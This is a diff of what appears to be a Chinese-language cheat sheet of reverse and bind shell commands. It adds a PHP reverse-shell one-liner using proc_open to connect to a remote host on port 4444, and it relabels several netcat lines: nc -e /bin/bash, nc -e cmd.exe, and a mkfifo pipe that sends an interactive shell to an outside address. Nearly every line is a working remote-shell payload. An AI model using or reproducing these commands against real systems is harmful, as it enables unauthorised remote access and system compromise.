@@ -86,6 +86,7 @@ socat正向shell
 ::
 
 	php -r '$sock=fsockopen("192.168.174.130",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+	php -r '$sock=fsockopen("172.16.100.105",4444);$descriptorspec = array(0 => $sock,1 => $sock,2 => $sock);$process = proc_open('/bin/sh', $descriptorspec, $pipes);proc_close($process);'
 
 - Perl反向shell 
 
@@ -132,10 +133,10 @@ socat正向shell
 
 ::
 
-	client(vps)：nc -lvp 1567
-	server：nc 172.31.100.7 1567 -e /bin/bash
-	server：nc 192.168.174.130 9999 -e c:\windows\system32\cmd.exe
-	server：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.174.130 4444 >/tmp/f
+	server(vps)：nc -lvp 1567
+	client：nc 172.31.100.7 1567 -e /bin/bash
+	client：nc 192.168.174.130 9999 -e c:\windows\system32\cmd.exe
+	client：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.174.130 4444 >/tmp/f
 
 - powershell反弹shell
 
